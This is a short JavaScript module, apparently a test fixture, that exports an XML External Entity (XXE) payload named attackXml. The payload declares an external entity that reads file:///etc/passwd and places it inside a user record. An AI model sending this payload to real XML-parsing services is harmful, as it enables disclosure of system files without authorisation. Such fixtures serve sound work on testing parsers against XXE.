module.exports.attackXml = `
<!DOCTYPE read-fs [<!ELEMENT read-fs ANY >
<!ENTITY passwd SYSTEM "file:///etc/passwd" >]>
<users>
  <user>
    <read-fs>&passwd;</read-fs>
    <name>C.K Frode</name>
  </user>
</users>`;
